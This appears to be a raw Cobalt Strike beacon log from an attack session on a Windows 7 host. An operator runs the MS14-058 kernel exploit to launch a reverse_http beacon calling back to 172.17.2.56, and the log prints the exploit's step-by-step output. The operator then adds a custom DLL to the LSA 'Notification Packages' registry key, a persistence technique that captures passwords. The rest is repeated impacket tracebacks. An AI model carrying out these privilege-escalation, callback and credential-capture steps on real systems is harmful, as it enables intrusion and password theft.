01/28 17:03:38 [metadata] 172.17.2.54 <- 172.17.2.54; computer: A-PC; user: a *; pid: 2248; os: Windows; version: 6.1; beacon arch: x86 (x64)
01/28 17:03:49 [input] <neo> elevate ms14-058 test
01/28 17:03:49 [task] Tasked beacon to run windows/beacon_http/reverse_http (172.17.2.56:80) via ms14-058
01/28 17:04:37 [checkin] host called home, sent: 104503 bytes
01/28 17:04:39 [output]
received output:
[*] Getting Windows version...
[*] Solving symbols...
[*] Requesting Kernel loaded modules...
[*] pZwQuerySystemInformation required length 42928
[*] Parsing SYSTEM_INFO...
[*] 145 Kernel modules found
[*] Checking module \SystemRoot\system32\ntoskrnl.exe
[*] Good! nt found as ntoskrnl.exe at 0x03c12000
[*] ntoskrnl.exe loaded in userspace at: 40000000
[*] pPsLookupProcessByProcessId in kernel: 0xFFFFF80003F651FC
[*] pPsReferencePrimaryToken in kernel: 0xFFFFF80003F689D0
[*] Registering class...
[*] Creating window...
[*] Allocating null page...
[*] Getting PtiCurrent...
[*] Good! dwThreadInfoPtr 0xFFFFF900C0FC7390
[*] Creating a fake structure at NULL...
[*] Triggering vulnerability...
[!] Executing payload...


01/28 17:06:06 [task] Tasked beacon to run: REG QUERY "HKLM\SYSTEM\CurrentControlSet\Control\Lsa" /v "Notification Packages"
01/28 17:06:06 [task] Tasked beacon to run: REG ADD "HKLM\SYSTEM\CurrentControlSet\Control\Lsa" /v "Notification Packages" /t REG_MULTI_SZ /d "scecli\0Win32Project3" /f
01/28 17:06:39 [checkin] host called home, sent: 266 bytes
01/28 17:06:39 [output]
received output:
Traceback (most recent call last):
  File "C:\Python37\Scripts\reg.py", line 4, in <module>
    __import__('pkg_resources').run_script('impacket==0.9.23.dev1+20210108.113210.1dec03a4', 'reg.py')
  File "C:\Python37\lib\site-packages\pkg_resources\__init__.py", line 3017, in <module>
    @_call_aside
  File "C:\Python37\lib\site-packages\pkg_resources\__init__.py", line 3003, in _call_aside
    f(*args, **kwargs)
  File "C:\Python37\lib\site-packages\pkg_resources\__init__.py", line 3030, in _initialize_master_working_set
    working_set = WorkingSet._build_master()
  File "C:\Python37\lib\site-packages\pkg_resources\__init__.py", line 659, in _build_master
    ws.require(__requires__)
  File "C:\Python37\lib\site-packages\pkg_resources\__init__.py", line 967, in require
    needed = self.resolve(parse_requirements(requirements))
  File "C:\Python37\lib\site-packages\pkg_resources\__init__.py", line 853, in resolve
    raise DistributionNotFound(req, requirers)
pkg_resources.DistributionNotFound: The 'pyOpenSSL>=0.13.1' distribution was not found and is required by impacket


01/28 17:06:39 [output]
received output:
Traceback (most recent call last):
  File "C:\Python37\Scripts\reg.py", line 4, in <module>
    __import__('pkg_resources').run_script('impacket==0.9.23.dev1+20210108.113210.1dec03a4', 'reg.py')
  File "C:\Python37\lib\site-packages\pkg_resources\__init__.py", line 3017, in <module>
    @_call_aside
  File "C:\Python37\lib\site-packages\pkg_resources\__init__.py", line 3003, in _call_aside
    f(*args, **kwargs)
  File "C:\Python37\lib\site-packages\pkg_resources\__init__.py", line 3030, in _initialize_master_working_set
    working_set = WorkingSet._build_master()
  File "C:\Python37\lib\site-packages\pkg_resources\__init__.py", line 659, in _build_master
    ws.require(__requires__)
  File "C:\Python37\lib\site-packages\pkg_resources\__init__.py", line 967, in require
    needed = self.resolve(parse_requirements(requirements))
  File "C:\Python37\lib\site-packages\pkg_resources\__init__.py", line 853, in resolve
    raise DistributionNotFound(req, requirers)
pkg_resources.DistributionNotFound: The 'pyOpenSSL>=0.13.1' distribution was not found and is required by impacket


01/28 18:41:50 [metadata] 172.17.2.54 <- 172.17.2.54; computer: A-PC; user: a *; pid: 2248; os: Windows; version: 6.1; beacon arch: x86 (x64)
